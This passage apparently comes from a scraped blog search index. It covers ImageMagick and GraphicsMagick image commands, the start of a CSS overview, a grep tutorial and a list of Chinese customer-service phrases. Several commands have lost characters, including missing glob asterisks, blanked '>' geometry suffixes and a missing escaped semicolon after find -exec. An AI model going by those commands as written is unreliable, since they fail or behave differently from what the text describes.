#应用图标512x512\nconvert -resize 480x800 文件名 截屏-@480x800.png #应用图标480x800\n宽358 高441\nconvert jh.jpg -resize 358x441 jhua.jpg\n\n格式转换Transform 缩放resize Fit 剪裁crop 旋转rotate 质量quality 翻转Flip  放大upscale\n 获取图片信息\nidentify image.png\n如果只需要获取宽高：\n$identify -format \"%wx%h\" image.png \n关闭 alpha 通道 设置背景色\nconvert image.png  -background white -alpha off out.png\n 批量修改图片尺寸\nconvert -resize 600x480 文件名 文件名\nfind ./ -name '.jpg' -exec convert -resize 600x480 {} {} ;\n\nfor file in .png; do convert $file -rotate 90 rotated-$file; done #批量旋转\n\n微信图标 28x28 108x108\nconvert -resize 28x28 in.png weixin28x28.png\n\n去除多余信息Exif信息\nconvert +profile “” 　或　-strip\n\nfind . -name '.jpg' -exec convert -strip {} {} ;\n先缩放后剪裁中心区域到指定大小\nconvert -resize \"500x250^\"  -gravity center -crop 500x250 5896fb1cb5fa3.png naoyuanxiao.png\n\n调亮度, 饱和度, 色调\n 调节亮度\ngm convert -modulate 150,100,100 input.jpg output.jpg\n\n调节饱和度\ngm convert -modulate 100,150,100 input.jpg output.jpg\n\n 调节色调\ngm convert -modulate 100,100,150 input.jpg output.jpg\n\n特效\n黑白\ngm convert -monochrome input.jpg output.jpg  \n\n 反色\ngm convert -negate input.jpg  output.jpg\n\n油画\ngm convert -paint 4 input.jpg output.jpg\n\n 模糊\ngm convert -blur 80x5 input.jpg output.jpg\n\n铅笔画\ngm convert -charcoal 2 input.jpg output.jpg\n\n 毛玻璃\ngm convert -spread 30 input.jpg output.jpg\n旋转与翻转\n旋转\ngm convert -rotate 90 input.jpg output.jpg\n\n 水平翻转\ngm convert -flop input.jpg output.jpg\n\n垂直翻转\ngm convert -flip input.jpg output.jpg\n裁剪与合成\n 裁剪成距离左上角 100,100, 长宽为 400x400 的图片\ngm convert -crop 400x400+100+100 input.jpg output.jpg\n\n合成图片\ngm composite -gravity center output.jpg input.jpg output.jpg\n\n创建缩略图\n 保持图片比例不变\ngm convert -resize 200x200 input.jpg  output.jpg\n\n指定图片大小\ngm convert -resize 200x200! input.jpg  output.jpg\n\n 既保证大小，还保证比例, 多余部分可按指定颜色进行填充\ngm convert -resize 200x200 -gravity center -extent 200x200 input.jpg  output.jpg\n\n给图片加水印\n在右下角加上 Hello World 水印\ngm convert -fill red -gravity southeast -pointsize 40 -draw 'text 40 40 \"Hello World\"' input.jpg output.jpg\n\n fill: 填充颜色\ngravity: 地理位置\n pointsize: 字体大小\ndraw: 绘制\n\n建立GIF图片\n 从 gif 图片转成一群 jpg 图片\ngm convert +adjoin input.gif output%d.jpg\n\n从一群 jpg 图片转成 gif 图片\ngm convert -delay 50 .jpg animation.gif\n\n adjoin: 邻接\ndelay: 延时\n\n缩放图像\n默认 比例缩放\nconvert example.png -resize 200×100 example.png\n图片变形 通过压缩或拉伸，强制转换为指定尺寸。600×600，而图片无需保持原有比例，可以在宽高后面加上一个感叹号!.\nconvert -resize 600×600! src.jpg dst.jpg\n\n剪裁图片\nimagemagick的convert命令通过crop参数，可以把一幅大图片分成若干块大小一样的图片，同时也可以在大图上截取一块图片来。命令格式为\n\nconvert 原始图片 -crop widthxheight+x+y 目标图片\n\n其中widthxheight是目标图片的尺寸，+x+y是原始图片的坐标点，这两组值至少要出现一组，也可以同时存在。另外该命令也可使用gravity来重新定义坐标系统。关于更多gravity的信息，请参考：ImageMagicK之gravity参数详解。下面介绍几种常用的命令。\n\n    把原始图片分割成多张小图\n\nconvert src.jpg -crop 100x100 dest.jpg\n\n假设src.jpg的大小是300x200,执行命令后将得到名为dest-0.jpg、dest-1.jpg...dest-5.jpg\n的6张大小为100x100的小图片。注意如果尺寸不是目标图片的整数倍，那么右边缘和下边缘的一部分图片就用实际尺寸\n\n    在原始图片上剪裁一张指定尺寸的小图\n\nconvert src.jpg -crop 100x80+50+30 dest.jpg\n在原始图片的上距离上部30像素左部50为起点的位置,分别向左向下截取一块大小为100x80的图片。如果x相对于坐标，宽度不够100，那就取实际值。\n\nconvert src.jpg -gravity center -crop 100x80+0+0 dest.jpg\n在原始图上截取中心部分一块100x80的图片\n\nconvert src.jpg -gravity southeast -crop 100x80+10+5 dest.jpg\n在原始图上截取右下角距离下边缘10个像素，右边缘5个像素一块100x80的图片\n\n 缩放图片\nImageMagick是一系列的用于修改、加工图像的命令行工具。ImageMagick能够快速地使用命令行对图片进行操作，对大量的图片进行批处理，或者是集成到bash脚本里去。ImageMagick能够执行相当多的操作。本指南将会指引你 ...\n\nImageMagick是一系列的用于修改、加工图像的命令行工具。ImageMagick能够快速地使用命令行对图片进行操作，对大量的图片进行批处理，或者是集成到bash脚本里去。\nImageMagick能够执行相当多的操作。本指南将会指引你学习ImageMagick的语法和基本操作，并且给你展示如何将各个操作结合起来以及如何对多个图像进行批处理。\n安装\n\n在Ubuntu以及很多Linux发行版中，没有默认安装ImageMagick，要在Ubuntu上安装它的话，请使用下面的命令：\nsudo apt-get install imagemagick\n转换图像的格式\n\n转换命令对一幅图像执行某项操作，并将其以你指定的名字保存。你能使用它完成的一个最基本的事情是转换你的图像到各种其他的格式。下面的命令将当前目录下的一个叫“howtogeek.png”的PNG文件转换为一个JPEG文件。\nconvert howtogeek.png howtogeek.jpg\n\nimage2\n你还可以指定JPEG格式图像的压缩级别：\nconvert howtogeek.png -quality 95 howtogeek.jpg\n\n这个数字的必须在1到100之间。在没有指定的情况下，ImageMagick使用原始图像的质量等级（quality level），否则的话ImageMagick取92作为其默认值。\n缩放图像\n\n转换命令还可以便捷地调整一幅图像的大小。下面的命令指示ImageMagick将一幅图像调整为200像素宽，100像素高。\nconvert example.png -resize 200×100 example.png\n\n在这个命令里面，我们对输入和输出使用了相同的文件名，这样ImageMagick将会覆盖掉原始文件。\nimage3\n在使用这个命令的时候，ImageMagick会尽量保持图像的纵横比。它将会调整图像以适应200×100的区域，这样图像就不是恰好200×100了。如果你想要强制把图像设置为指定的大小——即使这样做会改变图像的纵横比的话——那么在尺寸参数后面加一个叹号就可以了。\nconvert example.png -resize 200×100! example.png\n\n你还可以只指定特定的宽度或者高度，ImageMagick会在保持纵横比的情况下进行缩放。下面的命令将把一幅图像的宽度缩放为200像素宽：\nconvert example.png -resize 200 example.png\n\n下面的命令会把一幅图像缩放为100像素高：\nconvert example.png -resize x100 example.png\n旋转图像\n\nImageMagick能够快速地旋转图像。下面的命令将一幅叫做“howtogeek.jpg”的图像旋转90度，并将旋转后的图像保存为“howtogeek-rotated.jpg”：\nconvert howtogeek.jpg -rotate 90 howtogeek-rotated.jpg\n\n如果你指定了相同的文件名的话，ImageMagick将会用旋转过的图像覆盖掉原始图像。\nimage4\n应用特效\n\nImageMagick能够在一幅图像上做出很多种特效来。例如，下面的命令将一种叫做“炭笔画”（charcoal）的效果应用到一幅图像上：\nconvert howtogeek.jpg -charcoal 2 howtogeek-charcoal.jpg\n\nimage5\n这个命令将会让你的图像有一种艺术炭画的效果，-charcoal选项后面的2可以控制效果的强度。\nimage6\n下面的命令产生强度为1的“内爆”（implode）效果：\nconvert howtogeek.jpg -implode 1 howtogeek-imploded.jpg\n\nimage7\n“内爆”效果使得一副图像看上去中央好像有一个黑洞一样。\nimage8\n把各个操作结合起来！\n\n所有的这些命令都可以结合起来使用，这样一条命令，你就可以对一幅图像同时执行缩放、旋转、添加特效以及格式转换等操作：\nconvert howtogeek.png -resize 400×400 -rotate 180 -charcoal 4 -quality 95 howtogeek.jpg\n\nimage9\n使用ImageMagick，你能做的远不止这些，还有很多你可以结合起来使用的命令呢！\n批处理\n\n利用Bash，你能够便捷地对多个图像文件进行批处理。例如，下面的命令将会把当前目录下的所有PNG文件旋转之后，以原始文件名加“-rotated”组成的新文件名保存。\nfor file in  .png; do convert $file -rotate 90 rotated-$file; done\n\n稍微修改一下这个命令，你就可以用它做很多其他的事情了。此外你还可以把批处理命令集成到Bash脚本中，从而自动化图像处理的过程。\n\n任何关于ImageMagick的文章都会省略很多东西——因为它的命令和选项实在是太多了。如果你对ImageMagick的其他功能感兴趣的话，请查阅ImageMagick的官方文档来对ImageMagick进行更进一步的了解。\n\n11、使用ImageMagicK给图片瘦身\n\n原文：http://www.netingcn.com/imagemagick-strip-profile.html\n影响图片大小（占用空间）主要取决于图片的profile和quality。\n   quality：图片的品质，品质越高，占用的空间越大。适当降低品质能很大程度的减少图片的尺寸。一般来说，从品质100降到85，基本上肉眼很难区别其差别，但尺寸上减少很大。imagemagick通过通过-quality 来设置。\n   profile：记录图片一些描述信息。例如相机信息（光圈，相机型号）、photoshop元数据，颜色表等信息。它占用的空间可以从几KB到几百KB，甚至可能更大。ImageMagicK可以通过两种方式来去掉这些信息。+profile “” 　或　-strip\n下述图片中第一张原始图片为56KB，第二张图片执行了　convert +profile “” -strip src.jpg src-profile.jpg　后变成了26.3KB, 第三张设置图片品质为85，convert -quality 85 src.jpg src-quality85.jpg，图片大小变成了19.5KB，第四张是同时使用去掉profile和设置品质为85,convert -quality 85 -strip src.jpg src-p-q85.jpg，图片只有18.7KB。经过一个简单的命令处理，就可以把原始图片体积减小到原来的的三分之一。一般来说jpg格式的图片有比较大的操作空间，而png、gif有时候处理了反而变大。所以具体问题需要具体分析。\n\n原始图片\n\n去掉profile\n\nquality85\n\n最终图片\n\n在linux下可以很方便把某个目录下的所有jpg文件来一次瘦身运动，例如命令　find /tmp/images -iname “.jpg” -exec convert -strip +profile “” -quality 85 {} {} \\;　可以把/tmp/images目录下所有jpg图片进行压缩。\n\n转载自：http://www.linuxdiyf.com/viewarticle.php?id=170334\nConvert的resize子命令应该是在ImageMagick中使用较多的命令，它实现了图片任意大小的缩放，唯一需要掌握的就是如何使用它的一些参数测试设定值：\n\n此说明文件中所用的原始文件(src.jpg)，宽度：200，高度：150\n\n命令格式： -resize widthxheight{%} {@} {!} {} {} {^}\n\n默认时，宽度和高度表示要最终需要转换图像的最大尺寸，同时Convert会控制图片的宽和高，保证图片按比例进行缩放。\n\n如：convert -resize 600×600 src.jpg dst.jpg\n\n转换后的dst.jpg的图片大小(宽度为600，而高度已经按比例调整为450).\n\n2.如果需要转换成600×600，而图片无需保持原有比例，可以在宽高后面加上一个感叹号!.\n\n如：convert -resize 600×600! src.jpg dst.jpg\n\n只指定高度，图片会转换成指定的高度值，而宽度会按原始图片比例进行转换。\n\n如：convert -resize 400 src.jpg dst.jpg\n\n转换后的dst.jpg的图片大小(宽度为400，而高度已经按比例调整为300)，和例1有点类似。\n\n默认都是使用像素作为单位，也可以使用百分比来形象图片的缩放。\n\n如：convert -resize 50%x100%! src.jpg dst.jpg 或者convert -resize 50%x100% src.jpg dst.jpg\n\n此参数只会按你的比例计算后缩放，不保持原有比例。（结果尺寸为100×150)\n\n5.使用 @ 来制定图片的像素个数。\n\n如：convert -resize “10000@” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（115×86），图片保持原有比例（115×86= 9080 \u003c 10000)。\n\n6.当原始文件大于指定的宽高时，才进行图片放大缩小，可使用  命令后缀。\n\n如：convert -resize “100×50  ” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（67×50），图片保持原有比例。\n\n如：convert -resize “100×50  !” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（100×50），图片不保持原有比例。\n\n7.当原始文件小于指定的宽高时，才进行图片放大转换，可使用\u003c命令后缀。\n\n如：convert -resize “100×500\u003c” src.jpg dst.jpg 或者convert -resize “100×100\u003c!” src.jpg dst.jpg\n\n此命令执行后，dst.jpg和src.jpg大小相同，因为原始图片宽比100大。\n\n如：convert -resize “600×600\u003c” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（600×450），图片保持原有比例。\n\n如：convert -resize “600×600\u003c!” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（600×600），图片不保持原有比例。\n\n8.使用^命令后缀可以使用宽高中较小的那个值作为尺寸\n\n如：convert -resize “300×300^” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（400×300），图片保持原有比例，(300:300 \u003c 200:150，选择高作为最小尺寸）。\n\n如：convert -resize “300×200^” src.jpg dst.jpg\n\n此命令执行后，dst.jpg图片大小为（300×225），图片保持原有比例，(300:200   200:150，选择宽作为最小尺寸）。\n\n转载自：http://www.linuxdiyf.com/viewarticle.php?id=170334\n\nconvert命令可以用来转换图像的格式，支持JPG, BMP, PCX, GIF, PNG, TIFF, XPM和XWD等类型，下面举几个例子:\nconvert xxx.jpg xxx.png 将jpeg转成png文件\nconvert xxx.gif xxx.bmp 将gif转换成bmp图像\nconvert xxx.tiff xxx.pcx 将tiff转换成pcx图像\n还可以改变图像的大小:\nconvert -resize 1024x768 xxx.jpg xxx1.jpg 将图像的像素改为1024x768，注意1024与768之间是小写字母x\nconvert -sample 50%x50% xxx.jpg xxx1.jpg 将图像的缩减为原来的50% 50%\n旋转图像：\nconvert -rotate 270 sky.jpg sky-final.jpg 将图像顺时针旋转270度\n使用-draw选项还可以在图像里面添加文字：\nconvert -fill black -pointsize 60 -font helvetica -draw 'text 10,80 \"Hello, World!\" ‘ hello.jpg helloworld.jpg\n在图像的10,80 位置采用60磅的全黑Helvetica字体写上 Hello, World!\nconvert还有其他很多有趣和强大的功能，大家不妨可以试试。\n\n后台使用imagemagick的convert命令来处理图片真是太方便了。 - pb09013037的专栏 - 博客频道 - CSDN.NET\n1，获取图片信息\n\n$identify image.png  \nimage.png PNG 559x559 559x559+0+0 8-bit sRGB 467KB 0.000u 0:00.008  \n如果只需要获取宽高：\n\n$identify -format \"%wx%h\" image.png  \n2，放大，缩小 -resize\n\n$convert image.png -resize 200x200 resize.png  \n也可以按照比例（缩小一半）：\n\n$convert image.png -resize 50% resize.png  \n还可以多次缩放（先缩小一半，再放大一倍，效果就是变模糊了）：\n\n$convert image.png -resize 50%  -resize 200%  resize.png  \n3，放大，缩小 -sample\n与resize的区别在于-sample只进行了采样，没有进行插值，所以用来生成缩略图最合适\n\n$convert image.png -sample 50% sample.png  \n这个处理的效果就是马赛克：\n\n$convert image.png -sample 10% -sample 1000% sample.png  \n4，裁剪 -crop\n从（50，50）位置开始，裁剪一个100X100大小的图片：\n\n$convert image.png -crop 100x100+50+50 crop.png  \n如果不指定位置，则按照这个大小分隔出小图片，这个命令生成crop-0.png，crop-1.png，crop-2.png……：\n\n$convert image.png -crop 100x100 crop.png  \n可以指定裁剪位置的相对位置 -gravity：\n\n$convert image.png -gravity northeast -crop 100x100+0+0 crop.png  \n-gravity即指定坐标原点，有northwest：左上角，north：上边中间，northeast：右上角，east：右边中间……\n5，旋转 -rotate\n\n$convert image.png -rotate 45 rotate.png  \n默认的背景为白色，我们可以指定背景色：\n\n$convert image.png -backround black -rotate 45 rotate.png  \n$convert image.png -background #000000 -rotate 45 rotate.png  \n还可以指定为透明背景色：\n\n$convert image.png -background rgba(0,0,0,0) -rotate 45 rotate.png  \n6，合并\n合并指的是将一张图片覆盖到一个背景图片上：\n\n$convert image.png -compose over overlay.png -composite newimage.png  \n-compose指定覆盖操作的类型，其中over为安全覆盖，另外还有xor、in、out、atop等等\n覆盖的位置可以通过-gravity指定：\n\n$convert image.png -gravity southeast -compose over overlay.png -composite newimage.png  \n这是将图片覆盖到底图的右下角。\n7，更改图片的alpha通道\n分两步：\n\n$convert image.png -define png:format=png32  image32.png  \n$convert image32.png -channel alpha -fx \"0.5\" imagealpha.png  \n这个命令首先将image.png的格式改为png32（确保有alpha通道），然后更改alpha通道置为0.5，也就是半透明，值的范围为0到1.0\n可以使用将一张透明图片覆盖到原图上的方式做水印图片：\n\n$convert image.png -gravity center -compose over overlay.png -composite newimage.png  \n$convert image.png -gravity southeast -compose over overlay.png -composite newimage.png  \n8，拼接\n横向拼接（+append），下对齐（-gravity south）：\n\n$convert image1.png image2.png image3.png -gravity south +append result.png  \n纵向拼接（-append），右对齐（-gravity east）：\n\n$convert image1.png image2.png image3.png -gravity east -append result.png  \n9，格式转换\n\n$convert image.png image.jpg  \n$convert image.png -define png:format=png32 newimage.png  \n10，文字注释\n\n$convert image.png -draw \"text 0,20 'some text'\" newimage.png  \n从文件text.txt中读取文字，指定颜色，字体，大小，位置：\n\n$convert source.jpg -font xxx.ttf -fill red -pointsize 48 -annotate +50+50 @text.txt result.jpg  \n11，去掉边框\n$convert image.png -trim -fuzz 10% newimage.png","tags":null},{"location":"//blog.pytool.com/Post/前端技术/Web技术/web技术第六弹 页面样式表CSS综述","title":"web技术第六弹 页面样式表CSS综述","text":"---\n\nweb技术第六弹 页面样式表CSS综述\n\nspan class=\"spacer l\"2016-03-10 21:27:13/span span class=\"spacer l spacer-2\"1540浏览/span a href=\"#comment\" class=\"spacer l\"0评论/a\n\n       前面简单聊了聊HTML(5)的一些情况，这一弹开始聊CSS(3)样式表。我们先不进入细节，先从逻辑上，对整个样式表的功能和学习思路进行一次梳理。学习的时候，不管是HTML或是CSS，又或是JS，都有大量的标签名、属性值、方法名等等，这些东西不要死记硬背，理清思路，了解他们的逻辑关系，对这些东西有印象即可。需要开发的时候，用baidu（google正常情况下用不了没办法）网络速查一下具体的即可，开发多了，常用的也就顺手记住了。\n        ​样式表CSS的发展，经历了从CSS1到2.1，然后到现在正在蓬勃发展的CSS3时代，主要是取决于各类浏览器的支持进展。 CSS3标准，采用的是将所有的需求分模块定义的。不同的浏览器，都会在开发中逐步实现对这些模块的特性逐步予以支持。​目前绝大部分新的浏览器都支持CSS3，但是IE则是从IE9还是才逐步支持，目前在国内还有大量的windows xp+IE8的用户，尤其以政企客户为主，所以在开发这一类web应用的时候，还是要根据具体情况，对不支持CSS3特性的浏览器，做特定的处理。\n        首先，再次强调语义优先","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 grep","title":"Linux命令 grep","text":"-E, --extended-regexp     PATTERN is an extended regular expression (ERE)\n-R, --dereference-recursive 但遍历所有符号链接\n-i, --ignore-case         忽略大小写\n-n, --line-number         输出的同时打印行号\n-o, --only-matching       只显示匹配PATTERN 部分的行\n-v, --invert-match        匹配取反   输出不匹配的内容 选中不匹配的行\n\ngrep -insER\n指定文件查找字符\ngrep -E -i 'PidFile' /etc/ssh/sshdconfig\n\n 当前目录查找 并输出行号\ngrep \"SecondsBehindMaster\" . -R -n\n\n在/usr目录下查找带字符串'session'的文件\nsudo grep -r session /usr/\n\nlinux grep命令详解\n\nlinux grep命令\n\n1.作用\nLinux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。\n\n4.grep命令使用简单实例\n$ grep ‘test’ d\n显示所有以d开头的文件中包含 test的行。\n$ grep ‘test’ aa bb cc\n显示在aa，bb，cc文件中匹配test的行。\n$ grep ‘[a-z]\\{5\\}’ aa\n显示所有包含每个字符串至少有5个连续小写字符的字符串的行。\n$ grep ‘w\\(es\\)t.\\1′ aa\n如果west被匹配，则es就被存储到内存中，并标记为1，然后搜索任意个字符(.)，这些字符后面紧跟着 另外一个es(\\1)，找到就显示该行。如果用egrep或grep -E，就不用”\\”号进行转义，直接写成’w(es)t.\\1′就可以了。\n\n5.grep命令使用复杂实例\n假设您正在’/usr/src/Linux/Doc’目录下搜索带字符 串’magic’的文件：\n$ grep magic /usr/src/Linux/Doc/\nsysrq.txt: How do I enable the magic SysRQ key?\nsysrq.txt: How do I use the magic SysRQ key?\n其中文件’sysrp.txt’包含该字符串，讨论的是 SysRQ 的功能。\n默认情况下，’grep’只搜索当前目录。如果 此目录下有许多子目录，’grep’会以如下形式列出：\ngrep: sound: Is a directory\n这可能会使’grep’ 的输出难于阅读。这里有两种解决的办法：\n明确要求搜索子目录：grep -r\n或忽略子目录：grep -d skip\n如果有很多 输出时，您可以通过管道将其转到’less’上阅读：\n$ grep magic /usr/src/Linux/Documentation/ | less\n这样，您就可以更方便地阅读。\n\n有一点要注意，您必需提供一个文件过滤方式(搜索全部文件的话用 )。如果您忘了，’grep’会一直等着，直到该程序被中断。如果您遇到了这样的情况，按 CTRL c ，然后再试。\n\n下面还有一些有意思的命令行参数：\ngrep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，\ngrep -l pattern files ：只列出匹配的文件名，\ngrep -L pattern files ：列出不匹配的文件名，\ngrep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，\ngrep -C number pattern files ：匹配的上下文分别显示[number]行，\ngrep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，\ngrep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。\n\ngrep -n pattern files  即可显示行号信息\n\ngrep -c pattern files  即可查找总行数\n\n这里还有些用于搜索的特殊符号：\n\\ 和 \\ 分别标注单词的开始与结尾。\n例如：\ngrep man  会匹配 ‘Batman’、’manic’、’man’等，\ngrep ‘\\","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 100条甜言蜜语","title":"优秀服务的100条甜言蜜语","text":"优秀服务的100条甜言蜜语\n一、感同身受\n\n　　1) 我能理解；\n\n　　2) 我非常理解您的心情；\n\n　　3) 我理解您怎么会生气，换成是我我也会跟您一样的感受；\n\n　　4) 请您不要着急，我非常理解您的心情，我们一定会竭尽全力为您解决的；\n\n　　5) 如果我碰到您的这么多麻烦，也会是您现在这样的心情；\n\n　　6) 发生这样的事，给您带来不便了，不过我们应该积极面对才是对吗？；\n\n　　7) 没错，如果我碰到您这么多的麻烦，我也会感到很委屈的 ；\n\n　　8) 我非常理解您的心情，请放心，我们一定会查证清楚，给您一个满意的答复；\n\n　　9) 我真的很能理解，请放心，我们一定查证清楚，然后给您回复；\n\n　　10) “听得出来您很着急”“感觉到您有些担心” “我能体会您到很生气，让我来给您提供其它的建议，您看好吗？”“我能感受到您的失望，我可以帮助您的是……”“我能感受得到，××情况、业务给您带来了不必要的麻烦；\n\n　　11) “如果是我，我也会很着急的……”“我与您有同感……”“是挺让人生气的……”；\n\n　　12) 您好，给您带来这么多的麻烦实在是非常抱歉，如果我是您的话，我也会很生气的，请您先消消气给我几分钟时间给您说一下这个原因可以吗？\n\n　　13) 您说得很对，我也有同感；\n\n　　14) 给您造成的不便非常报歉，我们的心情跟您一样；\n\n　　15) 您的心情我可以理解，我马上为您处理；\n\n　　16) “小姐，我真的理解您……；\n\n　　17) 没错，如果我碰到您这样的麻烦，相信也会有您现在这样的心情；\n\n二、被重视\n\n　　18) 先生，你都是我们*年客户了；\n\n　　19) 您都是长期支持我们的老客户了；\n\n　　20) 您对我们业务这么熟，肯定是我们的老客户了，不好意思，我们出现这样的失误，太抱歉了\n\n　　21) 先生/小姐，很抱歉之前的服务让您有不好的感受，我们店铺对于客户的意见是非常重视的，我们会将您说的情况尽快反映给相关部门去做改进；\n\n三、用“我”代替“您”\n\n　　22) 您把我搞糊涂了—（换成）我不太明白，能否再重复下你的问题；\n\n　　23) 您搞错了—（换成）我觉得可能是我们的沟通存在误会；\n\n　　24) 我已经说的很清楚了—（换成）可能是我未解释清楚，令您误解了；\n\n　　25) 您听明白了吗？—（换成）请问我的解释你清楚吗？；\n\n　　26) 啊，您说什么？—（换成）对不起，我没有听明白，请您再说一遍好吗？；\n\n　　27) 您需要—（换成）我建议…… / 您看是不是可以这样……；\n\n四、站在客户角度说话\n\n　　28) 这样做主要是为了保护您的利益；\n\n　　29) 如果谁都可以帮您办理这么重要的业务，那对您的利益是很没有保障的；\n\n　　30) 我知道您一定会谅解的，这样做就是为了确保向您一样对我们店铺有着重要意义的忠诚顾客的权益；\n\n五、怎样的嘴巴才最甜\n\n　　31) 麻烦您了；\n\n　　32) 非常感谢您这么好的建议，我们会向上反映，因为有了您的建议，我们才会不断进步；\n\n　　33) （客户不满意但不追究时）谢谢您的理解和支持，我们将不断改进服务，让您满意；\n\n　　34) 先生，您都是我们的老客户了，我们当然不能辜负您的信任……；\n\n　　35) 这次给您添麻烦了，其实，我们也挺不好意思，您所说的情况我们将记录下来，并反馈给相关部门，会尽可能避免问题的再次出现……；\n\n　　36) 非常感谢您向我们提供这方面的信息，这会让我们的服务做得更好；\n\n　　37) 您这次问题解决后尽管放心使用！；\n\n　　38) 感谢您对我们工作的支持，希望您以后能一如既往支持我们！；\n\n　　39) 感谢您对我们的服务监督，这将让我们做得更好；\n\n　　40) 感谢您对我店铺的支持，您反馈的建议，将成为我们店铺日后改进工作的重要参考内容；\n\n　　41) 谢谢您对我们反映，我们会加强工作的培训，也欢迎您对我们工作随时进行监督；\n\n　　42) 谢谢您的反映，该问题一向是我店铺非常重视的问题，目前除了XX可以受理外，我们还提供了其他渠道，也希望您如果有更好的建议也可以提供给我们；\n\n　　43) 针对您刚才所反映的情况我们店铺也会不断地去改善，希望改善后能给您带来更好的服务；\n\n　　44) 让您产生这样的疑惑，也让您生气了，实在抱歉；\n\n　　45) 非常感谢您对我们的关心和支持，我们会尽快完善；\n\n　　46) 您的建议很好，我很认同 ；\n\n　　47) 非常感谢您提供给我们的宝贵建议，有您这样的客户是我们店铺的荣幸；\n\n六、拒绝的艺术\n\n　　48) 小姐，我很能理解您的想法，但非常抱歉，您的具体要求我们暂时无法满足我会先把您遇到的情况，反馈给相关部门，查证后再与您联络好吗？；\n\n　　49) 您说的这些，确实是有一定的道理，如果我们能帮您一定会尽力，不能帮您的地方，也请您谅解；\n\n　　50) 尽管我们目前暂时无法立刻去处理或解决这件事情，但我可以做到的是……；\n\n　　51) 感谢您的支持！请您留意以后的优惠活动；\n\n　　52) 先生/小姐，感谢您对我公司的XX活动的关注，目前现在我们还没有收到最新的通知，..或者迟点再咨询我们；\n\n　　53) 非常感谢您的关注，现在暂时没有开展，请您稍后留意；\n\n　　54) 先生/小姐，非常感谢您的反馈我们会尽最大的努力改进这方面的问题，也希望您能一如既往地支持和监督我们的工作，谢谢！；\n\n　　55) 小姐，您的心情我能够理解，那您希望我们怎样帮您解决呢；\n\n　　56) 先生，您是我们的客户，尽量让您满意，这是我们的工作要求，不好意思，您说的这些，确实是有一定的道理，如果我们能帮您，一定尽力，不能帮您的地方，也请您谅解；\n\n七、缩短通话\n\n　　57) 您好，为了方便您了解（记忆），我现在将该内容通过短信（邮件）发给您，请您留意查询；\n\n　　58) 因涉及的内容较多，具体内容我会通过邮件方式发给您详细了解，好吗？\n\n八、如何让客户“等”\n\n　　59) 不好意思，担误您的时间了；\n\n　　60) \"等待之前先提醒：“先生/小姐，请您稍等片刻，我马上为您查询”；\n\n　　61) 等待结束恢复通话：“先生/小姐，谢谢您的等待，已经帮您查询到……/现在帮您查询到的结果是……”\"；\n\n　　62) 请您稍等片刻，马上就好；\n\n　　63) 由于查询数据需要一些时间，不好意思要耽误（您）一点时间；\n\n　　64) 感谢您耐心的等候；\n\n九、记录内容\n\n　　65) 请问您方便提供具体情况吗（发生的详细地址、时间、现象等）？我们给您记录，方便我们尽快查询处理，感谢您的配合！；\n\n　　66) 谢谢您向我们提供的宝贵意见，我们会将该意见记录向有关部门反映！；\n\n　　67) 我非常希望能够帮助您，针对这件事，我们店铺一定会有专人尽快帮您处理，请您放心……；\n\n　　68) 先生您好！*现在是在普及的阶段，正因为有您的使用，我们才知道新活动推出以后使用的不足，非常感谢您及时把这不足之处及时反馈给我们；\n\n　　69) 这可能是我们工作人员的失误，我们会马上反馈您这个问题，请放心，我们会给您一个满意的处理结果！；\n\n　　70) 先生/小姐，您的提议我很认同，我会记录下来，希望能够尽快实施敬请留意！非常感谢您的宝贵意见；\n\n　　71) 非常抱歉，给您造成不便，请您稍等，我们马上测试一下，好吗？如确是有故障，跟客户解释:”谢谢您跟我们反映此这情况，我们会马上上报故障处理，请您稍后再试，好吗？\n\n　　72) 非常抱歉，给您造成不便，出现此情况肯定是某个环节出现了问题，您可以放心，如果是我们的问题，我们一定会负责到底，给您一个说法；\n\n十、其它\n\n　　73) 如果您对我解释不满意，可以提出您的建议，以便我以后改善?(面对与客户陷入僵局时)；\n\n　　74) 您好，您的彩铃很(动听，特别，不错，有个性等等)（需要外呼时）；\n\n　　75) 您的满意是我们的追求，祝您有个阳光好心情（当客户对我们解决了他的问题表示感谢的时候）；\n\n　　76) “请输入您的密码验证，请关注页面提示”，把关注页面提示放在后面可起提示作用；\n\n　　77) 没关系，我只是担心您会错过这些优惠，等您下次有更好的建议时／以后我们有其它活动时，我们再联系您？；\n\n　　78) 请您放心，您要求办理的退款已办理（取消）成功！、请您放心，您的话费我已帮您查询过，没有问题！、请您放心，您反映的问题已为您记录！；\n\n　　79) 感谢您的建议；\n\n　　80) 非常感谢您的耐心等待；\n\n　　81) 别着急，请您慢慢讲，我会尽力帮助您的；\n\n　　82) 感谢您的批评指正，我们将及时改正，不断提高服务水平；\n\n　　83) 谢谢，这是我们应该做的；\n\n　　84) 我们会将您反映的问题与相关部门联系，请您留下联系电话，我们将在小时内给您答复；\n\n　　85) 也许我说的不够清楚，请允许我再解释一遍；\n\n　　86) 请问您具体遇到什么麻烦，您放心，我们一定会尽力帮您 ；\n\n　　87) 请告诉我们您的想法，我们很乐意聆听您的意见 ；\n\n　　88) 先生/小姐，非常感谢您把您遇到的麻烦及时告诉我们；\n\n　　89) 您都是我们信用度非常好的客户，我们会第一时间帮助到您！\n\n十一、结束语\n\n　　90) 祝您生活愉快！\n\n　　91) 祝您中大奖！\n\n　　92) 当客户说他在开车时，结束语：路上要注意安全；\n\n　　93) 祝您生意兴隆！\n\n　　94) 希望下次有机会再为您服务！\n\n　　95) 请路上小心；\n\n　　96) 祝您一路顺风；\n\n　　97) 天气转凉了，记得加衣保暖；\n\n　　98) 今天下雨，出门请记得带伞；\n\n　　99) 祝您周末愉快！\n\n　　100) 祝您旅途愉快！","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 